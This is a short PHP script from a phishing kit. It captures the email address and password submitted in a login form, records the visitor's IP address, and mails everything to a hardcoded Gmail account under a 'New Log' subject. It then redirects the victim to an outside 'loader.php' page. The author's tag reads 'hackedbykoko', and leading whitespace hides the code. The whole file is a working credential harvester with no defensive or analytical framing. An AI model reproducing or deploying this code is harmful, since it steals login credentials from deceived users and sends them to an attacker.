<?
                                                                                                                                                              

          

                                                            
$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "Email-ID : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY hackedbykoko J5-----------\n";
$send = "michaelresult0052@gmail.com";
$subject = "--New Log $ip -- Source:(New Upgrade)";


mail($send,$subject,$message,$headers);


$redirect = "http://d2papa.com/loader.php";

header("Location: " . $redirect);
 
?>